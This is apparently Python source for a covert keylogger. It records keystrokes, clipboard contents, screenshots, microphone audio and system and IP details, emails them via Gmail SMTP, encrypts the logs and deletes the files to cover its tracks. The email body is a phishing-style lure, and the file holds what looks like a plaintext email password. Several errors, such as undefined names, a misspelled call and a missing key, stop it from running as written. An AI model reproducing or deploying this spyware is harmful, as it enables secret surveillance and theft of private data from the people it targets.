# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "fileer.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "image.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_fileer.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 90
iteration_time = 60
number_of_iteration_end = 4

email_address = "rishab.andrew@gmail.com" # Enter disposable email here
password = "ris.andrew_gomez@112" # Enter email password here

toaddr = "rishab.andrew@gmail.com" # Enter the email address you want to send your information to

file_path = "D:\\Python projects\\Advanced_Keylogger\\PythonProject1\\venv\\Keylogger" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls
def send_mail(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg ['To'] = toaddr
    msg['Subject'] ="Log File"

    body = "Do_you_like_pet???_Then_please_click_on_the_link_given_below..."

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    c = MIMEBase('application', 'octet-stream')
    c.set_payload((attachment).read())

    encoders.encode_base64(c)

    c.add_header('Content-Disposition', "attachment: filename = %s" % filename)
    msg.attach(c)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    s.quit()

#send_mail(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't ge Public IP Address (most likely max querry")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.sytem() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private Ip Address: " + IPAddr + "\n")

#clipboard_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied ")
copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)



def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iteration = 0
currentTime = time.time()
stoppingTime = time.time() + iteration_time

while number_of_iteration < number_of_iteration_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iteration += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    #send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]

for file in delete_files:
    os.remove(file_merge + file)
